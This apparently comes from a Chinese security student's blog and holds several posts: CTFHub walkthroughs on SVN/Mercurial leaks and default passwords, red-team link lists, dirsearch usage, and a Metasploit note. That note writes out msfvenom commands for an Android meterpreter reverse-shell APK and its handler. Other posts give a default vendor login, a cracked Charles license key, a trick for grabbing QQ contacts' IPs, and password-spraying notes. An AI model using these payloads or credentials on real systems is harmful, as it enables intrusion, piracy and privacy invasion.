<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./rip-svn.pl -v -u http://challenge-350f55b7f4229231.sandbox.ctfhub.com:10800/.svn/</span><br></pre></td></tr></table></figure>

<p>进入<code>.svn/pristine</code>目录，查看文件，发现有两个文件夹</p>
<p><img data-src="/../images/WRITEUP/image-20221024160207546.png" alt="image-20221024160207546"></p>
<p>其中<code>bb</code>文件夹中有一个文档，记录了flag</p>
<p><img data-src="/../images/WRITEUP/image-20221024160304334.png" alt="image-20221024160304334"></p>
<p>另一个<code>bf</code>文件夹记录了当前html内容</p>
<p><img data-src="/../images/WRITEUP/image-20221024160339892.png" alt="image-20221024160339892"></p>
<p><code>ctfhub&#123;3503d217e9a14b5d95df7855&#125;</code></p>
<h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞</span><br></pre></td></tr></table></figure>

<p>使用<code>dvcs-ripper</code>里的<code>rip-hg.pl</code>工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./rip-hg.pl -v -u http://challenge-b5f8d3ea776f7b25.sandbox.ctfhub.com:10800/.hg</span><br></pre></td></tr></table></figure>

<p>得到<code>.hg</code>隐藏文件夹</p>
<p>进入<code>.hs/store</code>目录，查看fncache文件</p>
<p><img data-src="/../images/WRITEUP/image-20221024161412440.png" alt="image-20221024161412440"></p>
<p>访问<code>/flag_14633778.txt</code>，得到flag</p>
<p><code>ctfhub&#123;cd9a58d44428b89a86c3b54e&#125;</code></p>
<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>《论字典的选择》</p>
<p><img data-src="/../images/WRITEUP/image-20221024163354760.png" alt="image-20221024163354760"></p>
<p><code>ctfhub&#123;300f7c6b0200acc7395561f8&#125;</code></p>
<h2 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h2><p>增加了验证码，提高了爆破门槛</p>
<p><a href="https://blog.csdn.net/qq_41262248/article/details/118578054">常见口令</a></p>
<p>不过百度搜一下就能搜到<code>eyou</code>的默认密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">账号:eyougw 密码:admin@(eyou)</span><br></pre></td></tr></table></figure>

<p>登录后就能得到flag</p>
<p><code>ctfhub&#123;d522ac8ac36a7648028f93f5&#125;</code></p>
]]></content>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>hvv</title>
    <url>/2022/09/15/hvv/</url>
    <content><![CDATA[<p>微步</p>
<span id="more"></span>

<h2 id="情报平台"><a href="#情报平台" class="headerlink" title="情报平台"></a>情报平台</h2><p><a href="https://x.threatbook.com/">微步</a></p>
<h2 id="HW重保之最强战神"><a href="#HW重保之最强战神" class="headerlink" title="HW重保之最强战神"></a>HW重保之最强战神</h2><p><a href="https://x.threatbook.com/v5/article?threatInfoID=11732">1</a></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11770">2</a></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11792">3</a></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11823">4</a></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11829">5</a></p>
<p><img data-src="https://img.threatbook.com/d4484fb07ad1f6032cea3cb9c8563f18df4dfb87eebc54ab451e658290c00776.jpg" alt="img"></p>
<p><img data-src="https://img.threatbook.com/f27b57cb15ff2495e045e8cf9381961f4852a29d96cefd28f5df7a859e1ec05f.jpg" alt="img"></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11897">6</a></p>
<p><img data-src="https://img.threatbook.com/22c1ebebd60772286b4859751e3683f13f38856b1458945a20a634c25e7ae745.png" alt="img"></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12014">7</a></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12157">8</a></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12496">9</a></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=18563">10</a></p>
<h2 id="重生之我是赏金猎人"><a href="#重生之我是赏金猎人" class="headerlink" title="重生之我是赏金猎人"></a>重生之我是赏金猎人</h2><p><a href="https://github.com/J0o1ey/BountyHunterInChina">https://github.com/J0o1ey/BountyHunterInChina</a></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=13282">1</a></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>代理池<a href="https://luminati-china.biz/">Luminati</a></p>
<p><a href="https://market.aliyun.com/products/56956004">阿里云市场API</a></p>
<p>Wireshark抓取QQ好友ip:020048是QQ电话的网络数据包中的关键词，通过打QQ电话，可以轻松抓取IP信息。</p>
<p><a href="https://www.openstego.com/">OpenStego隐写工具</a></p>
<p><a href="http://t.zoukankan.com/zlgxzswjy-p-6678081.html">NTFS文件流文件寄生</a></p>
<p><a href="https://blog.csdn.net/wxh0000mm/article/details/121204656">autorun.inf</a></p>
<p><a href="https://blog.csdn.net/qq_57307348/article/details/122904162">access注入</a></p>
<p>amass子域名搜集工具</p>
<p><strong>密码喷洒</strong>：在常规的爆破中，我们都是先用很多密码去碰撞一个账号，这样很容易导致账号被锁定。而密码喷洒就是先用一个密码去碰撞很多账号，此方法能有效的避免账号被锁定的问题</p>
<p>获取了域用户后，进行密码喷洒</p>
<p><a href="https://www.cnblogs.com/nongchaoer/p/16497098.html">内存马</a></p>
<p><a href="https://hfish.io/#/">蜜罐HFish</a></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12125">github免杀项目</a></p>
<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11706">红队打点</a></p>
]]></content>
      <tags>
        <tag>fun</tag>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>常用工具教程</title>
    <url>/2022/09/01/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<center>常用工具安装/使用教程</center>

<span id="more"></span>

<h1 id="Charles"><a href="#Charles" class="headerlink" title="Charles"></a>Charles</h1><p>&#x2F;&#x2F; 适用于Charles任意版本的注册码，谁还会想要使用破解版呢。<br>&#x2F;&#x2F; Charles 4.2目前是最新版，可用。</p>
<p>Registered Name: <a href="https://zhile.io/">https://zhile.io</a><br>License Key: 48891cf209c6d32bf4</p>
<p>本方法通杀charlse系列激活问题。</p>
<h1 id="Vi-x2F-Vim"><a href="#Vi-x2F-Vim" class="headerlink" title="Vi&#x2F;Vim"></a>Vi&#x2F;Vim</h1><p><a href="https://www.runoob.com/linux/linux-vim.html">Linux vi&#x2F;vim | 菜鸟教程</a></p>
<h1 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h1><p><a href="https://cloud.tencent.com/developer/article/2053952">参考</a></p>
<h1 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>dirsearch</strong> 是一个python开发的目录扫描工具。可以扫描网站的敏感文件和目录从而找到突破口</p>
<p>特点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">多线程</span><br><span class="line">可保持连接</span><br><span class="line">支持多种后缀（-e|–extensions asp,php）</span><br><span class="line">生成报告（纯文本，JSON）</span><br><span class="line">启发式检测无效的网页</span><br><span class="line">递归的暴力扫描</span><br><span class="line">支持HTTP代理</span><br><span class="line">用户代理随机化</span><br><span class="line">批量处理</span><br><span class="line">请求延迟</span><br></pre></td></tr></table></figure>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>项目路径：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
<p>windows直接下载，需要python3环境</p>
<p>kali linux自带，没有的话可以<code>sudo apt-get install dirsearch</code></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>以kali linux为例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch [-u|--url] target [-e|--extensions] extensions [options]</span><br></pre></td></tr></table></figure>

<p>参数options如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help 查看帮助</span><br><span class="line">-u URL, --url=URL 设置url</span><br><span class="line">-L URLLIST, --url-list=URLLIST 设置url列表</span><br><span class="line">-e EXTENSIONS, --extensions=EXTENSIONS 网站脚本类型</span><br><span class="line">-w WORDLIST, --wordlist=WORDLIST 设置字典</span><br><span class="line">-l, --lowercase 小写</span><br><span class="line">-f, --force-extensions 强制扩展字典里的每个词条</span><br><span class="line">-s DELAY, --delay=DELAY 设置请求之间的延时</span><br><span class="line">-r, --recursive Bruteforce recursively 递归地扫描</span><br><span class="line">–scan-subdir=SCANSUBDIRS, --scan-subdirs=SCANSUBDIRS 扫描给定的url的子目录(用逗号隔开)</span><br><span class="line">–exclude-subdir=EXCLUDESUBDIRS, --exclude-subdirs=EXCLUDESUBDIRS 在递归过程中排除指定的子目录扫描(用逗号隔开)</span><br><span class="line">-t THREADSCOUNT, --threads=THREADSCOUNT 设置扫描线程</span><br><span class="line">-x EXCLUDESTATUSCODES, --exclude-status=EXCLUDESTATUSCODES 排除指定的网站状态码(用逗号隔开)</span><br><span class="line">-c COOKIE, --cookie=COOKIE 设置cookie</span><br><span class="line">–ua=USERAGENT, --user-agent=USERAGENT 设置用户代理</span><br><span class="line">-F, --follow-redirects 跟随地址重定向扫描</span><br><span class="line">-H HEADERS, --header=HEADERS 设置请求头</span><br><span class="line">–random-agents, --random-user-agents 设置随机代理</span><br><span class="line">–timeout=TIMEOUT 设置超时时间</span><br><span class="line">–ip=IP 设置代理IP地址</span><br><span class="line">–proxy=HTTPPROXY, --http-proxy=HTTPPROXY 设置http代理。例如127.0.0.1:8080</span><br><span class="line">–max-retries=MAXRETRIES 设置最大的重试次数</span><br><span class="line">-b, --request-by-hostname 通过主机名请求速度，默认通过IP</span><br><span class="line">–simple-report=SIMPLEOUTPUTFILE 保存结果，发现的路径</span><br><span class="line">–plain-text-report=PLAINTEXTOUTPUTFILE 保存结果，发现的路径和状态码</span><br><span class="line">–json-report=JSONOUTPUTFILE 以json格式保存结果</span><br></pre></td></tr></table></figure>

<p>kali linux中软件包位置可以用<code>dpkg -L 软件包名</code>来确定</p>
<p>其中字典所在位置<code>/db/dicc.txt</code>，可以进行修改自定义字典，或者使用<code>-w</code>命令使用收集的字典</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>攻防世界&#x2F;baby_web</p>
<p>题目描述：想想初始页面是哪个</p>
<p>使用dirsearch扫描给定网址</p>
<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221018144227049.png" alt="image-20221018144227049"></p>
<p>访问<code>/index.php</code>会重定向到<code>1/php</code>，此时使用burpsuite抓包</p>
<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221018145058818.png" alt="image-20221018145058818"></p>
<p>可以得到flag</p>
]]></content>
      <tags>
        <tag>study</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Metaspolt</title>
    <url>/2022/08/30/Metaspolt/</url>
    <content><![CDATA[<center>Metasploit</center>

<span id="more"></span>

<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p><a href="https://blog.51cto.com/u_15346415/5171938">android</a><br>端口映射<br>sudo msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.241.131 lport&#x3D;9999 R &gt; &#x2F;home&#x2F;kali&#x2F;shell.apk</p>
<p>sudo apt install zipalign</p>
<p>keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keysize 2048  -validity 10000 </p>
<p>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore shell.apk alias_name<br><a href="https://blog.csdn.net/ming6365630/article/details/73088577/">private key algorithm is not c ompatible with signat</a><br><a href="https://blog.csdn.net/AinUser/article/details/107364987">The security strength of SHA-1 digest algorithm is not sufficient for this key size</a></p>
<p>keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keysize 1024  -validity 10000<br>jarsigner -verbose -sigalg SHA1withDSA -digestalg SHA1 -keystore my-release-key.Keystore shell.apk alias_name</p>
<p>jarsigner -verify -verbose -certs shell.apk</p>
<p>use exploit&#x2F;multi&#x2F;handler<br>set payload android&#x2F;meterpreter&#x2F;reverse_tcp<br>set lhost 192.168.241.131<br>set lport 9999</p>
<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p><a href="https://blog.csdn.net/QQ670663/article/details/122986061">Kali使用Metasploit内、外网渗透windows系统</a><br>sudo msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.241.131 lport&#x3D;9999 R &gt; &#x2F;home&#x2F;kali&#x2F;shell.apk</p>
]]></content>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>奇奇怪怪</title>
    <url>/2022/08/31/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="185035af17c34e3ff316fa587ebc80b27abfb996fffbd997be2fd2c7dad2a53d"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>fun</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用HEXO框架搭建博客</title>
    <url>/2022/08/30/%E5%A6%82%E4%BD%95%E7%94%A8HEXO%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<center>搭个博客先</center>

<span id="more"></span>

<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="github"><a href="#github" class="headerlink" title="github"></a>github</h2><p><a href="https://blog.csdn.net/weixin_43863487/article/details/126276207">windwos下配置ssh方式连接github&#x2F;gitee，及常见连接失败问题解决</a></p>
<h2 id="Node-js-x2F-git"><a href="#Node-js-x2F-git" class="headerlink" title="Node.js&#x2F;git"></a>Node.js&#x2F;git</h2><p><a href="https://blog.csdn.net/qq_51066068/article/details/123907277">node.js安装教程</a></p>
<p><a href="http://nodejs.cn/download/">下载 | Node.js 中文网</a></p>
<p><a href="https://blog.csdn.net/mukes/article/details/115693833">Git 详细安装教程（详解 Git 安装过程的每一个步骤</a></p>
<p><a href="https://registry.npmmirror.com/binary.html?path=git-for-windows/">git-for-windows</a></p>
<h2 id="HEXO"><a href="#HEXO" class="headerlink" title="HEXO"></a>HEXO</h2><p><a href="https://hexo.io/zh-cn/docs/">官方文档</a></p>
<p><a href="https://hexo.io/themes/">Hexo主题</a></p>
<p><a href="https://hexo.io/zh-cn/docs/">Maupassant主题</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/85037427">Hexo基本使用</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/251363116">hexo基本安装与配置</a></p>
<p><a href="https://blog.csdn.net/weixin_45019350/article/details/121901433">Hexo-零基础搭建个人博客(详解)</a></p>
<p><a href="https://blog.csdn.net/weixin_37058227/article/details/90294259">nexo+github 搭建个人博客</a></p>
<p><a href="https://garybear.cn/hexo-theme-insulin/">insulin</a></p>
<p><a href="https://theme-cards.ichr.me/">cards</a></p>
<p><a href="https://theme-next.js.org/docs/getting-started/installation.html">next</a></p>
<p><a href="https://theme-next.js.org/docs">https://theme-next.js.org/docs</a></p>
<h2 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h2><p><a href="http://www.itmind.net/116736.html">Typora</a></p>
<h1 id="一些配置问题"><a href="#一些配置问题" class="headerlink" title="一些配置问题"></a>一些配置问题</h1><h2 id="如何设置预览文字"><a href="#如何设置预览文字" class="headerlink" title="如何设置预览文字"></a>如何设置预览文字</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">预览</span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line">正文</span><br></pre></td></tr></table></figure>

<h2 id="如何插入图片"><a href="#如何插入图片" class="headerlink" title="如何插入图片"></a>如何插入图片</h2><p><a href="https://www.zhihu.com/question/419663130/answer/1907420868">插入图片</a></p>
<p>1.安装插件。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-marked --save</span><br></pre></td></tr></table></figure>

<p>2.再修改一下配置文件_config.yml，加入下面的配置。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br></pre></td></tr></table></figure>

<p>3.在“Blog-&gt;source”下新建”imags”文件夹。注意”imags”与”_posts”同级。</p>
<p>4.在Typora中“文件-&gt;设置偏好-&gt;图像“。在插入图片时”复制到指定路径“设置为</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">../../source/images//$&#123;filename&#125;</span><br></pre></td></tr></table></figure>

<p>勾选对本地、优先相对</p>
<p>5.在”格式-&gt;图像-&gt;设置图片根目录“将”Blog-&gt;source”设置为根目录。</p>
<h2 id="如何设置文章加密"><a href="#如何设置文章加密" class="headerlink" title="如何设置文章加密"></a>如何设置文章加密</h2><p><a href="https://blog.csdn.net/wwlk123/article/details/124436871">设置加密</a></p>
<p>1.安装插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-blog-encrypy</span><br></pre></td></tr></table></figure>

<p>2。修改配置，在根目录的配置文件_config.yml中添加以下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encrypt:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>

<p>3.博客文章添加加密字段</p>
<p>新建博文的时候，在头部添加加密的设置信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password: 密码</span><br><span class="line">message: 输入密码界面提示说明</span><br></pre></td></tr></table></figure>

<h2 id="或许可以插入播放器"><a href="#或许可以插入播放器" class="headerlink" title="或许可以插入播放器"></a>或许可以插入播放器</h2><p><a href="https://myhkw.cn/">🎵明月浩空网-永久免费的HTML5网站音乐播放器</a></p>
<h2 id="删除没用的图片"><a href="#删除没用的图片" class="headerlink" title="删除没用的图片"></a>删除没用的图片</h2><p><a href="https://blog.csdn.net/qq_59153970/article/details/126926752">删除Typora中未曾被引用过的多余图片</a></p>
<h1 id="可能出现的问题"><a href="#可能出现的问题" class="headerlink" title="可能出现的问题"></a>可能出现的问题</h1><p><a href="https://blog.csdn.net/m0_51943976/article/details/123103046">npm install时 node-sass npm ERR command failed问题解决</a></p>
]]></content>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>常用工具</title>
    <url>/2022/08/30/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<center>常用的在线工具链接/本地工具安装及使用</center>

<span id="more"></span>

<h1 id="加解密-x2F-码"><a href="#加解密-x2F-码" class="headerlink" title="加解密&#x2F;码"></a>加解密&#x2F;码</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p><a href="https://www.qqxiuzi.cn/bianma/ascii.htm">ASCII编码转换)</a></p>
<p><a href="https://tool.chinaz.com/tools/urlencode.aspx">URL编解码</a></p>
<p><a href="https://base64.us/">Base64 在线编码解码</a></p>
<p><a href="http://tool.chinaz.com/Tools/Base64.aspx">Base64加解密</a></p>
<p><a href="https://base64.supfree.net/">BASE64加密解密</a></p>
<p><a href="https://tool.oschina.net/encrypt?type=4">图片&#x2F;base64转换</a></p>
<p><a href="http://www.vgot.net/test/image2base64.php">Image2Base64</a></p>
<p><a href="https://www.qqxiuzi.cn/bianma/base.php">Base32编码解码</a></p>
<p><a href="http://deobfuscatejavascript.com/">JS解混淆</a></p>
<p><a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html">Rot13</a></p>
<p><a href="https://tool.bugku.com/mosi/">摩斯密码在线加密解密</a></p>
<p><a href="https://www.ssleye.com/ssltool/rc4_cipher.html">RC4在线加解密</a></p>
<p><a href="https://www.107000.com/T-Hex">Hex编码&#x2F;解码</a></p>
<p><a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a></p>
<h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><p><a href="https://www.cmd5.com/hash.aspx?s=123456">哈希MD5、SHA256等</a></p>
<p><a href="https://crypot.51strive.com/sha256.html">哈希函数比上面还多</a></p>
<h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><p><a href="http://www.ku51.net/ox2str/">字符转16进制</a></p>
<p><a href="http://www.txttool.com/wenben_binarystr.asp">在线转换二进制到字符串</a></p>
<p><a href="http://keycode.info/">JavaScript Event KeyCodes</a>：看了你就懂</p>
<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p><a href="https://cli.im/deqr">草料二维码解码器</a></p>
<p><a href="https://jiema.wwei.cn/">在线二维码解码器</a></p>
<h1 id="在线代码执行"><a href="#在线代码执行" class="headerlink" title="在线代码执行"></a>在线代码执行</h1><p><a href="https://c.runoob.com/compile/1/">php</a></p>
<p><a href="https://c.runoob.com/front-end/61/">WEB在线工具</a></p>
<p><a href="http://www.ab126.com/system/7423.html">二进制 十六进制转换计算器加法减法乘法除法</a></p>
<p><a href="https://c.runoob.com/front-end/854/">正则表达式在线测试</a></p>
<p><a href="https://codepen.io/pen">react</a></p>
<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p><a href="https://www.bbsmax.com/A/1O5ENAr4d7/">sqlmap</a><br><a href="https://www.jianshu.com/p/f31a9017ea19">kali设置root密码</a></p>
<h1 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h1><h2 id="短信"><a href="#短信" class="headerlink" title="短信"></a>短信</h2><p>有国内<br><a href="https://www.zusms.com/">1</a>   <a href="http://metacnnet.com/">2</a>   <a href="https://yunjisms.xyz/">3</a>   <a href="https://www.mianfeisms.xyz/">4</a><br>无国内<br><a href="https://www.storytrain.info/">1</a>   <a href="https://mianfeijiema.com/">2</a>   <a href="http://www.xnsms.com/">3</a>   <a href="https://www.lothelper.com/cn/shownumber">4</a>   <a href="https://jiemahao.com/">5</a>   <a href="http://sososms.com/">6</a></p>
<h2 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h2><p><a href="https://www.mailtemp.net/">mailtemp</a><br><a href="https://email10min.com/en">email10</a>  <a href="https://10minmailnet.com/zh">10mail</a><br><a href="http://24mail.chacuo.net/">24mail</a><br><a href="https://yopmail.net/zh/">yopmail</a><br>替代后缀：<br>@yopmail.fr<br>@yopmail.net<br>@cool.fr.nf<br>@jetable.fr.nf<br>@courriel.fr.nf<br>@moncourrier.fr.nf<br>@monemail.fr.nf<br>@monmail.fr.nf<br>@hide.biz.st<br>@mymail.infos.st<br><a href="http://www.lyhxy.love/">lsyx</a><br><a href="https://mail.td/en">mail</a></p>
<p><a href="https://www.likecs.com/show-341060.html">list</a></p>
<h1 id="依赖库-x2F-插件"><a href="#依赖库-x2F-插件" class="headerlink" title="依赖库&#x2F;插件"></a>依赖库&#x2F;插件</h1><p><a href="https://registry.npmmirror.com/binary.html">好多库</a></p>
<p><a href="https://www.jb51.net/zt/jquerydown.htm">jquery下载</a></p>
<p><a href="https://registry.npmmirror.com/binary.html?path=chromedriver/">chromedriver</a></p>
<p><a href="https://nodejs.org/download/release/">node.js</a></p>
<p><del><a href="https://www.it610.com/article/1294538499516604416.htm">jdk下载账号</a></del>寄了 自己注册吧</p>
<h1 id="GFW"><a href="#GFW" class="headerlink" title="GFW"></a>GFW</h1><p><a href="https://lancellc.gitbook.io/clash/">Introduce - Clash</a></p>
<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p><a href="https://ehang-io.github.io/nps/#/?id=nps">NPS</a></p>
<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><p><a href="http://s.tool.chinaz.com/robots/">Robots.txt检测</a></p>
<p><a href="https://www.ctftools.com/down/">CTF资源库|CTF工具下载|CTF工具包|CTF工具集合</a></p>
<h1 id="手机"><a href="#手机" class="headerlink" title="手机"></a>手机</h1><p><a href="https://sspai.com/post/63647?ivk_sa=1024320u">FDroid</a><br><a href="https://www.sqlsec.com/2018/05/termux.html">termux</a></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p><a href="https://www.heresecurity.wiki/about/readme">渗透</a><br><a href="https://blog.csdn.net/sj349781478/article/details/119753696">常见厂商防火墙默认账密</a></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://blog.csdn.net/zibery/article/details/124824833">Godzilla下载使用</a></p>
<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p><a href="https://github.com/rootphantomer/Blasting_dictionary">字典！</a><br><a href="https://blog.csdn.net/weixin_39623273/article/details/111200624">burpsuite爆破字典</a><br><a href="https://zhuanlan.zhihu.com/p/161020764">破解字典不求人，Kali字典的正确使用姿势！</a><br><code>cupp -l</code> 从仓库去下载一些字典<br><code>cupp -i</code> 跟用户做问答最后去生成一个字典</p>
<p><a href="https://www.somd5.com/download/dict/">somd5字典</a></p>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>御剑<br>dirsearch</p>
<h3 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘"></a>资产测绘</h3><p><a href="https://ping.chinaz.com/">多地ping</a><br><a href="https://www.17ce.com/">多ping</a></p>
<p><a href="https://fofa.info/">FOFA</a><br><a href="http://sso.tidesec.com/">TIDE</a><br><a href="https://hunter.qianxin.com/">奇安信鹰图</a><br><a href="https://quake.360.cn/">360Quake</a><br><a href="https://www.zoomeye.org/">钟馗之眼</a><br><a href="https://www.shodan.io/">shodan</a><br><a href="https://www.ditecting.com/">ditecting</a><br><a href="https://sso.telnet404.com/">telnet404</a></p>
<p><a href="http://whatweb.bugscaner.com/look/">CMS识别</a></p>
<p><a href="https://beian.miit.gov.cn/">ICP备案</a></p>
<p><a href="https://www.tianyancha.com/">天眼查</a></p>
<p><strong>插件</strong></p>
<h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><p><a href="https://blog.csdn.net/weixin_41489908/article/details/112545789">免杀工具 – FourEye</a></p>
<h2 id="CVE-x2F-POC"><a href="#CVE-x2F-POC" class="headerlink" title="CVE&#x2F;POC"></a>CVE&#x2F;POC</h2><p><a href="https://www.exploit-db.com/">exploit</a></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><a href="http://z.zcjun.com/">子域名爆破</a><br><a href="http://www.dnslog.cn/">DNSlog</a><br><a href="https://www.whatweb.net/">whatweb*</a><br><a href="https://www.xssye.com/">XSS平台</a></p>
<h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><h3 id="如何查看局域网内所有的IP"><a href="#如何查看局域网内所有的IP" class="headerlink" title="如何查看局域网内所有的IP"></a>如何查看局域网内所有的IP</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a><a href="https://blog.csdn.net/qq_40657585/article/details/83097386">文件格式</a></h3>]]></content>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>默认口令</title>
    <url>/2022/10/24/%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
